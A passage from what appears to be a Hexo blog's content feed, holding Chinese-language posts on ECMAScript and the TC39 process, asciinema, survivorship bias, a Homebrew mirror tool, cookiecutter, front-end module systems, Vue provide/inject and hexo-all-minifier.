Association）。因为计算机的国际化，组织的标准牵涉到很多其他国家，因此组织决定改名表明其国际性。现名称已不属于首字母缩略字。<br><br>组织在1961年的日内瓦创建为了标准化欧洲的计算机系统。在欧洲制造、销售或开发计算机和电信系统的公司都可以申请成为会员。</p></blockquote><p>由此我们知道，Ecma国际是1961年成立的一家制定计算机标准的机构。</p><h2 id="ECMAScript"><a href="#ECMAScript" class="headerlink" title="ECMAScript"></a>ECMAScript</h2><p>ECMAScript 是一种由Ecma国际在标准 ECMA-262 中定义的脚本语言规范。和 ECMAScript 有关的标准还有 ECMA-262，ECMA-290，ECMA-327，ECMA-357，ECMA-402，ECMA-404，ECMA-414等等。其中 ECMA-290，ECMA-327，ECMA-357 等没有推广开来，被废弃。</p><h3 id="相关标准"><a href="#相关标准" class="headerlink" title="相关标准"></a>相关标准</h3><ul><li><code>ECMA-262</code>：ECMAScript 语言规范本身</li><li><code>ECMA-402</code>：基于 ECMAScript 5 或者之后版本的一些国际化 API 标准</li><li><code>ECMA-404</code>：JSON 规范</li><li><code>ECMA-414</code>：规定了哪些规范是和 ECMAScript 有关的。目前内部就包含了 262，402 和 404</li></ul><h3 id="历史版本"><a href="#历史版本" class="headerlink" title="历史版本"></a>历史版本</h3><div class="table-container"><table><thead><tr><th>Ver.</th><th>Date</th><th>Difference</th></tr></thead><tbody><tr><td>1.0</td><td>1997/06</td><td>首版</td></tr><tr><td>2.0</td><td>1998/06</td><td>格式修正，以使得其形式与ISO/IEC16262国际标准一致</td></tr><tr><td>3.0</td><td>1999/12</td><td>强大的正则表达式，更好的词法作用域链处理，新的控制指令，异常处理，错误定义更加明确，数据输出的格式化及其它改变</td></tr><tr><td>4.0</td><td>放弃</td><td>由于关于语言的复杂性出现分歧，第4版本被放弃，其中的部分成为了第5版本及Harmony的基础</td></tr><tr><td>5.0</td><td>2009/12</td><td>新增“严格模式（strict mode）”，一个子集用作提供更彻底的错误检查,以避免结构出错。澄清了许多第3版本的模糊规范，并适应了与规范不一致的真实世界实现的行为。增加了部分新功能，如getters及setters，支持JSON以及在对象属性上更完整的反射</td></tr><tr><td>5.1</td><td>2011/06</td><td>ECMAScript标5.1版形式上完全一致于国际标准ISO/IEC 16262:2011</td></tr><tr><td>6.0</td><td>2015/06</td><td>ECMAScript 2015（ES2015），第 6 版，最早被称作是 ECMAScript 6（ES6），添加了类和模块的语法，其他特性包括迭代器，Python风格的生成器和生成器表达式，箭头函数，二进制数据，静态类型数组，集合（maps，sets 和 weak maps），promise，reflection 和 proxies。作为最早的 ECMAScript Harmony 版本，也被叫做ES6 Harmony</td></tr><tr><td>7.0</td><td>2016/06</td><td>ECMAScript 2016（ES2016），第 7 版，多个新的概念和语言特性</td></tr><tr><td>8.0</td><td>2017/06</td><td>ECMAScript 2017（ES2017），第 8 版，多个新的概念和语言特性</td></tr><tr><td>9.0</td><td>2018/06</td><td>ECMAScript 2018 （ES2018），第 9 版，包含了异步循环，生成器，新的正则表达式特性和 rest/spread 语法</td></tr><tr><td>10.0</td><td>2019/06</td><td>ECMAScript 2019 （ES2019），第 10 版</td></tr></tbody></table></div><h2 id="TC39-Process"><a href="#TC39-Process" class="headerlink" title="TC39 Process"></a>TC39 Process</h2><p>每一项新特性，要最终纳入 ECMAScript 规范中，TC39 拟定了一个处理过程，称为 TC39 Process，其中共包含5个阶段。</p><h3 id="Stage-0-Strawman（稻草人阶段）"><a href="#Stage-0-Strawman（稻草人阶段）" class="headerlink" title="Stage 0: Strawman（稻草人阶段）"></a>Stage 0: Strawman（稻草人阶段）</h3><p>一种推进ECMAScript发展的自由形式，任何TC39成员，或者注册为TC39贡献者的会员，都可以提交。</p><h3 id="Stage-1-Proposal（提案阶段）"><a href="#Stage-1-Proposal（提案阶段）" class="headerlink" title="Stage 1: Proposal（提案阶段）"></a>Stage 1: Proposal（提案阶段）</h3><p>该阶段产生一个正式的提案。</p><ul><li>确定一个带头人来负责该提案，带头人或者联合带头人必须是TC39的成员。</li><li>描述清楚要解决的问题，解决方案中必须包含例子，API以及关于相关的语义和算法。</li><li>潜在问题也应该指出来，例如与其他特性的关系，实现它所面临的挑战。</li><li>polyfill和demo也是必要的。</li></ul><h3 id="Stage-2-Draft（草案阶段）"><a href="#Stage-2-Draft（草案阶段）" class="headerlink" title="Stage 2: Draft（草案阶段）"></a>Stage 2: Draft（草案阶段）</h3><p>草案是规范的第一个版本，与最终标准中包含的特性不会有太大差别。草案之后，原则上只接受增量修改。</p><ul><li>草案中包含新增特性语法和语义的，尽可能的完善的形式说明，允许包含一些待办事项或者占位符。</li><li>必须包含2个实验性的具体实现，其中一个可以是用转译器实现的，例如Babel。</li></ul><h3 id="Stage-3-Candidate（候选阶段）"><a href="#Stage-3-Candidate（候选阶段）" class="headerlink" title="Stage 3: Candidate（候选阶段）"></a>Stage 3: Candidate（候选阶段）</h3><p>候选阶段，获得具体实现和用户的反馈。此后，只有在实现和使用过程中出现了重大问题才会修改。</p><ul><li>规范文档必须是完整的，评审人和ECMAScript的编辑要在规范上签字。</li><li>至少要有两个符合规范的具体实现。</li></ul><h3 id="Stage-4-Finished（完成阶段）"><a href="#Stage-4-Finished（完成阶段）" class="headerlink" title="Stage 4: Finished（完成阶段）"></a>Stage 4: Finished（完成阶段）</h3><p>已经准备就绪，该特性会出现在年度发布的规范之中。</p><ul><li>通过 Test-262 的验收测试。</li><li>有2个通过测试的实现，以获取使用过程中的重要实践经验。</li><li>ECMAScript的编辑必须规范上的签字。</li></ul><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://github.com/tc39" target="_blank" rel="noopener">Github of TC39</a></li><li><a href="https://www.ecma-international.org/memento/tc39-rf-tg.htm" target="_blank" rel="noopener">Website of TC39</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
      </categories>
      
      
        <tags>
            
            <tag> FrontEnd </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Shell录屏工具 asciinema 介绍</title>
      <link href="/2020/01/31/040_How_to_record_the_screen_of_terminal/"/>
      <url>/2020/01/31/040_How_to_record_the_screen_of_terminal/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><img src="/2020/01/31/040_How_to_record_the_screen_of_terminal/demo.gif"><h2 id="依赖"><a href="#依赖" class="headerlink" title="依赖"></a>依赖</h2><ul><li><a href="https://github.com/asciinema/asciinema" target="_blank" rel="noopener"><code>asciinema</code></a> 录屏工具，输出 <code>json</code></li><li><a href="https://github.com/asciinema/asciicast2gif" target="_blank" rel="noopener"><code>asciicast2gif</code></a> 格式转换工具 <code>json</code> 转 <code>gif</code></li></ul><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><h3 id="asciinema-录屏工具"><a href="#asciinema-录屏工具" class="headerlink" title="asciinema 录屏工具"></a><code>asciinema</code> 录屏工具</h3><pre><code>$ brew install asciinema</code></pre><h3 id="asciicast2gif-格式转换工具"><a href="#asciicast2gif-格式转换工具" class="headerlink" title="asciicast2gif 格式转换工具"></a><code>asciicast2gif</code> 格式转换工具</h3><ul><li><a href="https://repo.huaweicloud.com/java/jdk/8u192-b12/jdk-8u192-macosx-x64.dmg" target="_blank" rel="noopener">jdk 下载安装</a></li></ul><pre><code># 安装依赖$ brew install ImageMagick gifsicle leiningen# 下载源码$ git clone --recursive https://github.com/asciinema/asciicast2gif.git# 安装依赖$ cd asciicast2gif &amp;&amp; npm i# 编译得到 ./asciicast2gif$ lein cljsbuild once main &amp;&amp; lein cljsbuild once page # 添加环境变量 (替换 /path/to/)$ export PATH=&quot;$PATH:/path/to/asciicast2gif&quot;</code></pre><h2 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h2><h3 id="录屏输出-json"><a href="#录屏输出-json" class="headerlink" title="录屏输出 json"></a>录屏输出 json</h3><pre><code class="lang-bash"># 开始录屏$ asciinema rec# asciinema: recording asciicast to tmpj6mmcek_-ascii.cast# asciinema: press &lt;ctrl-d&gt; or type &quot;exit&quot; when you&#39;re done# 结束录屏 CTRL + D# asciinema: recording finished# asciinema: press &lt;enter&gt; to upload to asciinema.org, &lt;ctrl-c&gt; to save locally# asciinema: asciicast saved to tmpj6mmcek_-ascii.cast</code></pre><h3 id="json-转-gif"><a href="#json-转-gif" class="headerlink" title="json 转 gif"></a>json 转 gif</h3><pre><code class="lang-bash">$ ./asciicast2gif tmpj6mmcek_-ascii.cast demo.gif# ==&gt; Loading tmpj6mmcek_.cast...# ==&gt; Spawning PhantomJS renderer...# ==&gt; Generating frame screenshots...# ==&gt; Combining 5 screenshots into GIF file...# ==&gt; Done.</code></pre>]]></content>
      
      
      <categories>
          
          <category> Toolkit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>幸存者偏差 (Survivorship bias)</title>
      <link href="/2020/01/30/039_Survivorship_bias/"/>
      <url>/2020/01/30/039_Survivorship_bias/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>世界的关注点永远在那些偶然的成功者身上，却忽略了上万倍没被概率选中的失败者。</p></blockquote><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>幸存者偏差，另译为 “生存者偏差” 或 “生存偏见”，是一种常见的逻辑谬误（“谬误”而不是“偏差”），意思是只能看到经过某种筛选而产生的结果，而没有意识到筛选的过程，因此忽略了被筛选掉的关键信息。</p><h2 id="军事中的案例"><a href="#军事中的案例" class="headerlink" title="军事中的案例"></a>军事中的案例</h2><p>第二次世界大战期间的1941年，美国哥伦比亚大学统计学亚伯拉罕·沃德教授接受美国海军要求，运用他在统计方面的专业知识给出关于“飞机应该如何加强防护，才能降低被炮火击落的几率”的建议。沃德教授针对盟军的轰炸机遭受攻击后的相关数据，进行分析和研究后发现：机翼是整个飞机中最容易遭受攻击的位置，但是发动机则是最少被攻击的位置。因此沃德教授给出的结论是“我们应该强化发动机的防护”，但是美国海军指挥官认为“应该加强机翼的防护，因为这是最容易被击中的位置”。</p><img src="/2020/01/30/039_Survivorship_bias/plane.png"><p>沃德教授提出以下其加强机身防护意见的依据：</p><ul><li>本次统计的样本，仅包含没有因敌火射击而坠毁并安全返航的轰炸机。</li><li>沃德教授假设所有中弹的弹著点应该会平均分布在机身各处，而能安全返航的轰炸机机身中弹数量较多的区域，是即使被击中也比较不会导致坠机的部位。</li><li>机翼被击中很多次的轰炸机，大多数仍然能够安全返航。</li><li>发动机弹孔较少的原因并非真的不容易中弹，而是一旦中弹，其安全返航并生还的可能性就微乎其微。</li></ul><p>军方最终采取了教授提出的增加发动机防护的建议，后来证实该决策是完全正确的。这项研究对当时仍在发展初期的作业研究领域具有深远的影响。</p><h2 id="其他案例收集"><a href="#其他案例收集" class="headerlink" title="其他案例收集"></a>其他案例收集</h2><ul><li>有人把一幅画给一位无神论者看，画上画着一群正在祈祷拜神的人，并告诉他，这些人在随后的沉船事故中都活了下来。无神论者淡淡一问：“我想看看那些祈祷完被淹死的人的画像在哪儿？死人又不会说话。“</li><li>成功人士乔布斯和比尔盖茨都辍学了，所以要想成功就必须要辍学。其谬误在于没有看到辍学而没有成功的人占绝大多数。</li><li>如果只看 <code>NBA</code> 球员，会发现身高比较高的人得分率没有身高较低的人高。这是因为身高矮还能进 NBA 的人必然是用其他优势补足了身高的弱势。</li><li>任贤齐，当年凭借一首“心太软”开始红遍大江南北。据他本人透露，当年有几十首作品寄给了唱片公司，《心太软》也是其中之一。唱片公司在审核的时候，本来已经将这首歌“丢进垃圾桶”，但由于最后没有找到心仪的歌曲，就在回去翻找的时候翻出了这首“遗珠”，连他们自己都想不到，最后竟然会如此之火。然而有成百上千的“任贤齐”现在早已远离“歌手”这个职业，他们可能正开着一家小店，也可能正在工地搬砖。在大多数情况下，就算你再有天赋再努力，你的作品也不会刚好被往回找遗珠的唱片公司所青睐。</li><li>读书无用论</li></ul><h2 id="如何避免"><a href="#如何避免" class="headerlink" title="如何避免"></a>如何避免</h2><ol><li>意识到 “沉默证据” 的存在。</li><li>找到不同类型、不同层次的 “沉默证据”</li><li>尝试排除“随机性”</li></ol>]]></content>
      
      
      <categories>
          
          <category> Methodology </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Thoughts </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BRM - Homebrew 仓库管理工具</title>
      <link href="/2020/01/29/038_Homebrew_registry_manager/"/>
      <url>/2020/01/29/038_Homebrew_registry_manager/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p><a href="https://github.com/Vincent0700/homebrew-brm" target="_blank" rel="noopener"><code>BRM (Homebrew Registry Manager)</code></a> 是 <code>macOS</code> 包管理器 <code>Homebrew</code> 的仓库管理工具，它可以检测距你延迟最低的镜像站并快速切换，目前支持官方(<code>github</code>)源、清华源、阿里源、中科大源.</p></blockquote><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><pre><code>$ npm install -g homebrew-brm</code></pre><p>Or</p><pre><code>$ yarn global add homebrew-brm</code></pre><h2 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h2><pre><code>$ brm -hUsage: brm [options] [command]Homebrew registry manager for macOSOptions:  -V, --version    output the version number  -h, --help       output usage informationCommands:  ls               List all the registries  current          Show current registry and URL  use &lt;registry&gt;   Change homebrew registry  test [registry]  Show response time for specific or all registries</code></pre><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><img src="/2020/01/29/038_Homebrew_registry_manager/demo.gif"><h3 id="展示可用的仓库列表"><a href="#展示可用的仓库列表" class="headerlink" title="展示可用的仓库列表"></a>展示可用的仓库列表</h3><img src="/2020/01/29/038_Homebrew_registry_manager/list.jpg"><h3 id="设置仓库"><a href="#设置仓库" class="headerlink" title="设置仓库"></a>设置仓库</h3><img src="/2020/01/29/038_Homebrew_registry_manager/use.jpg"><h3 id="展示当前使用的仓库信息"><a href="#展示当前使用的仓库信息" class="headerlink" title="展示当前使用的仓库信息"></a>展示当前使用的仓库信息</h3><img src="/2020/01/29/038_Homebrew_registry_manager/current.jpg"><h3 id="自动安装环境依赖-homebrew-git"><a href="#自动安装环境依赖-homebrew-git" class="headerlink" title="自动安装环境依赖 (homebrew, git)"></a>自动安装环境依赖 (homebrew, git)</h3><img src="/2020/01/29/038_Homebrew_registry_manager/auto_install.jpg"><h3 id="测试镜像站速度，延迟从小到大排序"><a href="#测试镜像站速度，延迟从小到大排序" class="headerlink" title="测试镜像站速度，延迟从小到大排序"></a>测试镜像站速度，延迟从小到大排序</h3><img src="/2020/01/29/038_Homebrew_registry_manager/speed.jpg"><h2 id="仓库地址"><a href="#仓库地址" class="headerlink" title="仓库地址"></a>仓库地址</h2><p><a href="https://github.com/Vincent0700/homebrew-brm" target="_blank" rel="noopener">https://github.com/Vincent0700/homebrew-brm</a></p>]]></content>
      
      
      <categories>
          
          <category> Toolkit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Shell </tag>
            
            <tag> Javascript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用 cookiecutter 搭建起手模板</title>
      <link href="/2020/01/22/037_Usage_of_cookiecutter/"/>
      <url>/2020/01/22/037_Usage_of_cookiecutter/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p><code>cookiecutter</code> 是我之前在写 <code>flask</code> 项目时发现的一个项目构建工具，<a href="https://github.com/cookiecutter/cookiecutter" target="_blank" rel="noopener">传送门</a>。本来这是一个 <code>python</code> 项目的 <code>wizard</code> 工具，现想引入到 <code>js</code> 项目中来作为个人定制化起手模板的构建工具。工具本身使用起来也是非常简单，详细说明参考 <a href="https://s0cookiecutter0readthedocs0io.icopy.site/en/latest/usage.html" target="_blank" rel="noopener">官方文档</a>。</p></blockquote><h2 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h2><p>自己写了一个简单的 <span class="highlight">Javascript</span> 项目模板，<a href="https://github.com/Vincent0700/cookiecutter-js" target="_blank" rel="noopener">传送门</a>。</p><h3 id="Feature"><a href="#Feature" class="headerlink" title="Feature"></a>Feature</h3><ol><li>初始化基础配置文件</li><li>初始化 <span class="highlight">eslint</span> + <span class="highlight">prettier</span> 相关配置</li><li>初始化完毕后执行 <code>yarn install</code></li></ol><h3 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h3><ol><li>安装 <span class="highlight">cookiecutter</span></li></ol><pre><code class="lang-bash">$ pip install cookiecutter</code></pre><ol><li>使用模板</li></ol><pre><code class="lang-bash">$ cookiecutter gh:vincent0700/cookiecutter-jsproject_name [project_name]: demoauthor [vincent0700 (https://vincentstudio.info)]:email [wang.yuanqiu007@gmail.com]:description [say somthing]: a demo project</code></pre>]]></content>
      
      
      <categories>
          
          <category> Toolkit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> FrontEnd </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>前端模块化方式总结</title>
      <link href="/2020/01/14/036_Frontend_modular_ways/"/>
      <url>/2020/01/14/036_Frontend_modular_ways/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>本文旨在对前端模块化方式 <code>CommonJS</code>, <code>AMD</code>, <code>CMD</code>, <code>UMD</code>, <code>ES6 Module</code> 的大致使用方式、解决的问题以及特性进行归纳总结，方便以后查阅。</p></blockquote><h2 id="VanillaJs"><a href="#VanillaJs" class="headerlink" title="VanillaJs"></a>VanillaJs</h2><h3 id="IIFE-amp-闭包"><a href="#IIFE-amp-闭包" class="headerlink" title="IIFE &amp; 闭包"></a>IIFE &amp; 闭包</h3><pre><code class="lang-javascript">// people.jsvar people = (function() {  let name = &quot;Sophia&quot;;  let age = 12;  return {    getName: () =&gt; name,    getAge: () =&gt; age  };})();// invoke.jsconsole.log(people.getName());console.log(people.getAge());</code></pre><p>有了 <span class="highlight">namespace</span> 的概念，外部无法覆盖 <span class="highlight">name</span> 和 <span class="highlight">age</span>，但是 <span class="highlight">people</span> 依然是全局变量。</p><h3 id="改良"><a href="#改良" class="headerlink" title="改良"></a>改良</h3><pre><code class="lang-javascript">// people.js(function(window) {  let name = &quot;Sophia&quot;;  let age = 12;  return {    getName: () =&gt; name,    getAge: () =&gt; age,    say: () =&gt; say(name)  };})(window, say);// say.js(function(window) {  window.say = (name) =&gt; {    console.log(`Hello ${name}.`)  }})(window);</code></pre><pre><code class="lang-html">&lt;script src=&quot;./dance.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;./people.js&quot;&gt;&lt;/script&gt;&lt;script&gt;  people.say();&lt;/script&gt;</code></pre><p>有了依赖的概念，但是依然没有解决全局变量的问题，而且模块引入顺序必须要靠人工维护。</p><h2 id="CommonJS"><a href="#CommonJS" class="headerlink" title="CommonJS"></a>CommonJS</h2><p>主要用于 <span class="highlight">NodeJs</span>，浏览器原生不支持，可通过 <span class="highlight">browserify</span> 或 <span class="highlight">webpack</span> 打包后在浏览器上跑。</p><pre><code class="lang-javascript">// people.jsconst { say } = require(&quot;./say.js&quot;);let name = &quot;Sophia&quot;;let age = 12;module.exports = {  getName: () =&gt; name,  getAge: () =&gt; age,  say: () =&gt; say(name)};// say.jsmodule.exports = {  say: (name) =&gt; {    console.log(`Hello ${name}.`);  }}// invoke.jsconst people = require(&quot;./people.js&quot;);people.say();</code></pre><h3 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h3><ul><li>以文件为单元模块</li><li>同步加载模块</li><li>模块可以被加载多次，但只会在第一次执行，而后读取的是之前运行的缓存。</li><li>模块加载顺序和代码中的顺序一致</li><li>导出的值是拷贝</li></ul><h2 id="AMD-RequireJs"><a href="#AMD-RequireJs" class="headerlink" title="AMD / RequireJs"></a>AMD / RequireJs</h2><p><span class="highlight">AMD</span> (Asynchronous Module Definition) 顾名思义，主要解决模块的异步加载的问题。</p><pre><code class="lang-javascript">// people.jsdefine([&#39;./say.js&#39;], function({ say }) {  let name = &quot;Sophia&quot;;  let age = 12;  return {    getName: () =&gt; name,    getAge: () =&gt; age,    say: () =&gt; say(name)  };});</code></pre><h3 id="特性-1"><a href="#特性-1" class="headerlink" title="特性"></a>特性</h3><ul><li>异步加载</li><li>依赖前置</li></ul><h2 id="CMD-SeaJs"><a href="#CMD-SeaJs" class="headerlink" title="CMD / SeaJs"></a>CMD / SeaJs</h2><p><span class="highlight">CMD</span> (Common Module Definition) 通用模块定义，最早由阿里的大神玉伯提出。</p><pre><code class="lang-javascript">// people.jsdefine(function (requie, exports, module) {  const { say } = require(&#39;./say.js&#39;);  let name = &quot;Sophia&quot;;  let age = 12;  module.exports = {    getName: () =&gt; name,    getAge: () =&gt; age,    say: () =&gt; say(name)  };});</code></pre><h3 id="特性-2"><a href="#特性-2" class="headerlink" title="特性"></a>特性</h3><ul><li>相对自然的依赖声明风格</li><li>依赖就近 (<span class="highlight">RequireJs</span> 2.0+ 也加入此特性)</li></ul><h2 id="UMD"><a href="#UMD" class="headerlink" title="UMD"></a>UMD</h2><p><span class="highlight">UMD</span> (Universal module definition) 是 <span class="highlight">AMD</span> 和 <span class="highlight">CommonJS</span> 的综合的产物。<span class="highlight">AMD</span> 适用于浏览器，<span class="highlight">CommonJS</span> 用于 <span class="highlight">NodeJs</span> 服务端，为了解决模块跨平台问题，衍生出 <span class="highlight">UMD</span> 规范。其本质就是通过 <span class="highlight">if/else</span> 判断全局变量，然后决定如何加载。</p><pre><code class="lang-javascript">(function (window, factory) {    if (typeof exports === &#39;object&#39;) {        module.exports = factory();    } elseif (typeof define === &#39;function&#39; &amp;&amp; define.amd) {        define(factory);    } else {        window.eventUtil = factory();    }})(this, function () {    //module ...});</code></pre><h2 id="ES6-Module"><a href="#ES6-Module" class="headerlink" title="ES6 Module"></a>ES6 Module</h2><pre><code class="lang-javascript">// people.jsimport { say } from &quot;./say.js&quot;let name = &quot;Sophia&quot;;let age = 12;export default {  getName: () =&gt; name,  getAge: () =&gt; age,  say: () =&gt; say(name)};</code></pre><h3 id="特性-3"><a href="#特性-3" class="headerlink" title="特性"></a>特性</h3><ul><li>模块输出是值的引用，而 <span class="highlight">CommonJS</span> 是值的拷贝</li><li>静态语法，只能卸载顶层，而 <span class="highlight">CommonJS</span> 是动态语法，可以写在判断里</li><li>和 <span class="highlight">CommonJS</span> 一样，模块只会被加载一次，不同的是，<span class="highlight">import</span> 指向模块的引用，而 <span class="highlight">CommonJS</span> 加载的时候就会执行该脚本，然后内存中生成一个对象，而后只会返回会缓存的结果</li><li><span class="highlight">this</span> 是 <span class="highlight">undefined</span>，而 <span class="highlight">CommonJS</span> 是指向当前模块</li><li>无论模块内是否声明 <span class="highlight">use strict</span>，都采用严格模式</li></ul>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
      </categories>
      
      
        <tags>
            
            <tag> FrontEnd </tag>
            
            <tag> Javascript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vue 跨级访问祖先组件 (provide/inject)</title>
      <link href="/2020/01/13/035_Usage_of_provide_and_inject_in_vue/"/>
      <url>/2020/01/13/035_Usage_of_provide_and_inject_in_vue/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>在看 <code>Element</code> 面包屑组件的源码时记录</p></blockquote><h2 id="缘起"><a href="#缘起" class="headerlink" title="缘起"></a>缘起</h2><p>首先看一段 <code>Breadcrumb.vue</code> 的实现代码。</p><pre><code class="lang-vue">&lt;template&gt;  &lt;div class=&quot;el-breadcrumb&quot; aria-label=&quot;Breadcrumb&quot; role=&quot;navigation&quot;&gt;    &lt;slot&gt;&lt;/slot&gt;  &lt;/div&gt;&lt;/template&gt;&lt;script&gt;  export default {    name: &#39;ElBreadcrumb&#39;,    props: {      separator: {        type: String,        default: &#39;/&#39;      },      separatorClass: {        type: String,        default: &#39;&#39;      }    },    provide() {      return {        elBreadcrumb: this      };    },    mounted() {      const items = this.$el.querySelectorAll(&#39;.el-breadcrumb__item&#39;);      if (items.length) {        items[items.length - 1].setAttribute(&#39;aria-current&#39;, &#39;page&#39;);      }    }  };&lt;/script&gt;</code></pre><p>这里，<code>Breadcrumb</code> 直接把自己的 <code>this</code> 暴露给下级组件，然后注入到 <code>BreadcrumbItem</code> 组件中，以达到向子孙组件传递信息的目的，下面就来总结一下 <code>Vue</code> 中 <code>provide/inject</code> 的用法。</p><h2 id="参数详解"><a href="#参数详解" class="headerlink" title="参数详解"></a>参数详解</h2><ul><li><code class="api-param-key">provide</code><code class="api-param-value">Object | () =&gt; Object</code></li><li><code class="api-param-key">inject</code><code class="api-param-value">Array<string>| { [key: string]: string | Symbol | Object }</string></code></li></ul><h2 id="详细介绍"><a href="#详细介绍" class="headerlink" title="详细介绍"></a>详细介绍</h2><ol><li><p>Vue 2.2.0 新增，主要为高阶插件/组件库跨级访问祖先组件数据的方法，并不推荐直接用于应用程序代码中。</p></li><li><p><code>provide</code> 和 <code>inject</code> 绑定并不是可响应的。然而，如果你传入了一个可监听的对象，那么其对象的属性还是可响应的。</p></li><li><p><code>Symbol</code> 作为 <code>key</code></p></li></ol><pre><code class="lang-vue">const s = Symbol()const Provider = {  provide () {    return {      [s]: &#39;foo&#39;    }  }}const Child = {  inject: { s },  // ...}</code></pre><ol><li><code>inject</code> 作为 <code>props</code> 或 <code>data</code> 默认值，只在 <code>^2.2.1</code> 有效，以下版本注入值会在初始化之后得到。</li></ol><pre><code class="lang-vue">const Child = {  inject: [&#39;foo&#39;],  data () {    return {      bar: this.foo    }  }}</code></pre><ol><li>参数化配置，只在 <code>^2.5.0</code> 有效</li></ol><pre><code class="lang-vue">// 设置默认值const Child = {  inject: {    foo: { default: &#39;foo&#39; }  }}// 工厂方法设置默认值const Child = {  inject: {    foo: {      from: &#39;bar&#39;,      default: () =&gt; [1, 2, 3]    }  }}// 从不同名字的属性注入const Child = {  inject: {    foo: {      from: &#39;bar&#39;,      default: &#39;foo&#39;    }  }}</code></pre><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ol><li><a href="https://vuejs.bootcss.com/v2/api/#provide-inject" target="_blank" rel="noopener">Vue.js 中文文档</a></li><li><a href="https://github.com/ElemeFE/element/blob/dev/packages/breadcrumb/src/breadcrumb.vue" target="_blank" rel="noopener">Element 源码</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
      </categories>
      
      
        <tags>
            
            <tag> FrontEnd </tag>
            
            <tag> Vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo 资源压缩 | hexo-all-minifier</title>
      <link href="/2019/12/31/034_Usage_of_hexo-all-minifier_copy/"/>
      <url>/2019/12/31/034_Usage_of_hexo-all-minifier_copy/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h2><p><a href="https://github.com/chenzhutian/hexo-all-minifier" target="_blank" rel="noopener">https://github.com/chenzhutian/hexo-all-minifier</a></p><h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><pre><code class="lang-bash">$ npm install hexo-all-minifier --save</code></pre><h3 id="简单配置"><a href="#简单配置" class="headerlink" title="简单配置"></a>简单配置</h3><p>在 _config.yml 里添加</p><pre><code class="lang-yml">all_minifier: true</code></pre><h3 id="全部配置"><a href="#全部配置" class="headerlink" title="全部配置"></a>全部配置</h3><p>详细说明见 <a href="https://github.com/chenzhutian/hexo-all-minifier/blob/master/README.md" target="_blank" rel="noopener">README</a></p><pre><code class="lang-yml">html_minifier:  enable: true  ignore_error: false  exclude:css_minifier:  enable: true  exclude:    - &#39;*.min.css&#39;js_minifier:  enable: true  mangle: true  compress:  exclude:    - &#39;*.min.js&#39;js_concator:  enable: false  bundle_path: &#39;/js/bundle.js&#39;  front: false  silent: falseimage_minifier:  enable: true  interlaced: false  multipass: false  optimizationLevel: 2  pngquant: false  progressive: false</code></pre><h2 id="源码学习"><a href="#源码学习" class="headerlink" title="源码学习"></a>源码学习</h2><pre><code class="lang-javascript">// /node_modules/hexo-all-minifier/index.jsconst isEnabled = process.env.NODE_ENV !== &#39;development&#39;  &amp;&amp; (hexo.config.hasOwnProperty(&#39;all_minifier&#39;) === false ||   hexo.config.all_minifier === true);if (isEnabled) {  // ...}</code></pre><blockquote><p>由于压缩处理时间较长，开发时热更频繁，所以这里判断了环境变量，开发环境不启用压缩，也是挺人性化的，所以我们的 npm 脚本可以写成这样 <code>&quot;dev&quot;: &quot;NODE_ENV=development hexo s&quot;</code></p></blockquote><pre><code class="lang-javascript">// /node_modules/hexo-all-minifier/index.jsif (isEnabled) {  // HTML 